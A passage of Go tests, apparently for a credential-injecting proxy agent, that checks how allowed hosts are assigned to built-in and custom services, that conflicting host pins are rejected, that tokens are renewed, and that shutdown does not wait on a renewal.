	if len(cat.Services) != 1 || !slices.Equal(cat.Services[0].Hosts, []string{"*.example.com"}) || !slices.Equal(ignored, []string{"*.twilio.com (only as twilio)", "*.twilio.com (only as twilio)"}) {
		t.Fatalf("kept %+v, ignored %v", cat.Services, ignored)
	}
}

// The agent guards one built-in service's header per host, so no two
// built-in services may share one.
func TestBuiltInHostsDontOverlap(t *testing.T) {
	for _, p := range catalog.Presets {
		for _, host := range p.Hosts {
			for _, q := range catalog.Presets {
				if q.ID != p.ID && slices.ContainsFunc(q.Hosts, func(qh string) bool { return covers(qh, host) || covers(host, qh) }) {
					t.Errorf("%s and %s share %s", p.ID, q.ID, host)
				}
			}
		}
	}
}

func TestTheBoxNamesTheServiceForAnAllowedHost(t *testing.T) {
	// A plain allowed host is a custom service's: the edge can't file it
	// under GitHub and have GH_TOKEN set to a token gh sends to github.com.
	h := &hosts{trusted: trustedHosts([]string{"api.internal.example"})}
	cat, ignored := h.set(clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		{ID: "GitHub", Name: "GitHub", Hosts: []string{"api.internal.example"}},
	}}))
	if len(cat.Services) != 0 || !slices.Equal(ignored, []string{"api.internal.example"}) {
		t.Fatalf("kept %+v, ignored %v", cat.Services, ignored)
	}
	// The box can give a built-in service its own server.
	h = &hosts{trusted: trustedHosts([]string{"GitLab=gitlab.corp.example"})}
	cat, ignored = h.set(clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		{ID: "gitlab", Name: "GitLab", Hosts: []string{"gitlab.corp.example", "gitlab.other.example"}},
		{ID: "acme", Name: "Acme", Hosts: []string{"gitlab.corp.example"}},
	}}))
	if len(cat.Services) != 1 || cat.Services[0].ID != "gitlab" || !slices.Equal(cat.Services[0].Hosts, []string{"gitlab.corp.example"}) ||
		!slices.Equal(ignored, []string{"gitlab.other.example", "gitlab.corp.example (only as gitlab)"}) {
		t.Fatalf("kept %+v, ignored %v", cat.Services, ignored)
	}
	if s, ok := h.ServiceForHost("gitlab.corp.example"); !ok || s.ID != "gitlab" {
		t.Fatalf("served as %+v", s)
	}
	// A pinned host is the built-in's, as its catalog hosts are: a custom
	// wildcard the box also allowed, listed first, doesn't take it.
	h = &hosts{trusted: trustedHosts([]string{"gitlab=gitlab.corp.example", "*.corp.example"})}
	cat, ignored = h.set(clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		{ID: "acme", Name: "Acme", Hosts: []string{"*.corp.example", "gitlab.corp.example"}, Header: "X-Acme-Key"},
		{ID: "gitlab", Name: "GitLab", Hosts: []string{"gitlab.corp.example"}},
	}}))
	if !slices.Equal(ignored, []string{"gitlab.corp.example (only as gitlab)"}) || len(cat.Services) != 2 {
		t.Fatalf("kept %+v, ignored %v", cat.Services, ignored)
	}
	if s, ok := h.ServiceForHost("gitlab.corp.example"); !ok || s.ID != "gitlab" || s.Header != "PRIVATE-TOKEN" {
		t.Fatalf("pinned host served as %+v", s)
	}
	if s, ok := h.ServiceForHost("wiki.corp.example"); !ok || s.ID != "acme" {
		t.Fatalf("the custom wildcard's own host: %+v %v", s, ok)
	}
	for in, ok := range map[string]bool{"gitlab=gitlab.corp.example": true, " GitLab = gitlab.corp.example": true, "acme=api.acme.example": false, "gitlab=https://x": false} {
		if err := checkAllowHost(in); (err == nil) != ok {
			t.Errorf("%q: %v", in, err)
		}
	}
}

func TestPinsCantShareAHost(t *testing.T) {
	for allow, ok := range map[string]bool{
		"gitlab=gitlab.corp.example":                  true,
		"gitlab=gitlab.corp.example,*.corp.example":   true,
		"gitlab=x.corp.example,github=x.corp.example": false,
		"gitlab=*.corp.example,github=x.corp.example": false,
		"gitlab=api.github.com":                       false,
		"gitlab=*.github.com":                         false,
		"gitlab=x.corp.example,x.corp.example":        false,
		"gitlab=*.corp.example,api.corp.example":      false,
		"gitlab=gitlab.com":                           true, // its own catalog host
	} {
		if err := checkPins(strings.Split(allow, ",")); (err == nil) != ok {
			t.Errorf("%s: %v", allow, err)
		}
	}
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	u, _ := url.Parse(r.edge.URL)
	if a, err := Start(bg, Config{Home: t.TempDir(), Remote: u, Token: r.token, Listen: "127.0.0.1:0", AllowHosts: []string{"gitlab=api.github.com"}}); err == nil {
		a.Close()
		t.Fatal("started with a pin on GitHub's host")
	}
}

func TestRefreshRenewsTheToken(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	tok2, _, err := r.engine.CreateToken(bg, core.TokenSpec{EnvID: core.DefaultEnv, Name: "renewed"})
	if err != nil {
		t.Fatal(err)
	}
	tr := proxy.EdgeTransport()
	tr.TLSClientConfig = &tls.Config{RootCAs: r.edge.Client().Transport.(*http.Transport).TLSClientConfig.RootCAs}
	u, _ := url.Parse(r.edge.URL)
	var calls atomic.Int32
	a, err := Start(bg, Config{Home: r.home, Remote: u, Token: r.token, Listen: "127.0.0.1:0", Transport: tr, Refresh: 20 * time.Millisecond,
		AllowHosts: []string{"api.late.test"}, RefreshToken: func(context.Context) (string, error) { calls.Add(1); return tok2, nil }})
	if err != nil {
		t.Fatal(err)
	}
	defer a.Close()
	// The first token stops working; the renewed one keeps the catalog fresh.
	for _, tk := range r.engine.Tokens(core.DefaultEnv) {
		if tk.Name != "renewed" {
			if err := r.engine.RevokeToken(bg, tk.ID); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := r.engine.AddService(bg, core.Service{ID: "late", Name: "Late", Hosts: []string{"api.late.test"}}); err != nil {
		t.Fatal(err)
	}
	if err := coretest.SetSecret(bg, r.engine, core.DefaultEnv, "late", "real-late"); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(2 * time.Second)
	for {
		if _, ok := a.hosts.ServiceForHost("api.late.test"); ok {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("catalog not refreshed with the renewed token (%d renewals)", calls.Load())
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func TestCloseDoesntWaitOnARenewal(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	tr := proxy.EdgeTransport()
	tr.TLSClientConfig = &tls.Config{RootCAs: r.edge.Client().Transport.(*http.Transport).TLSClientConfig.RootCAs}
	u, _ := url.Parse(r.edge.URL)
	asked := make(chan struct{}, 1)
	a, err := Start(bg, Config{Home: r.home, Remote: u, Token: r.token, Listen: "127.0.0.1:0", Transport: tr, Refresh: 10 * time.Millisecond,
		RefreshToken: func(ctx context.Context) (string, error) {
			select {
			case asked <- struct{}{}:
			default:
			}
			<-ctx.Done() // a server that never answers
			return "", ctx.Err()
		}})
	if err != nil {
		t.Fatal(err)
	}
	<-asked
	done := make(chan struct{})
	go func() { a.Close(); close(done) }()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("Close waited on the renewal")
	}
}
